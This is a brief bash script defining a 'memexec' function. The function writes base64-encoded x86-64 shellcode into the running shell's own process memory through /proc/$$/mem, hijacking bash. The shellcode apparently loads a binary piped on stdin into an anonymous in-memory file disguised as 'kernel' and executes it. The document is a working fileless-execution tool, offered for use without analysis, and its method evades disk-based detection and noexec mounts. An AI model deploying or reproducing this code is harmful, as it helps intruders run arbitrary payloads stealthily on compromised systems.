#! /bin/bash

memexec() { bash -c 'cd /proc/$$;exec 4>mem;base64 -d<<<SInlSIHsEgQAAEi4a2VybmVsAABqAFC4PwEAAEiJ50gx9g8FSYnAuAAAAAC/AAAAAEiJ5roABAAADwVIicJIg/oAfhG4AQAAAL8DAAAASInmDwXr0rhCAQAATInHagBIieZqAFRIieJBuAAQAAAPBbg8AAAAv2MAAAAPBQ==|dd bs=1 seek=$[$(cat syscall|cut -f9 -d" ")]>&4'; }

# Example: cat /usr/bin/id | memexec 

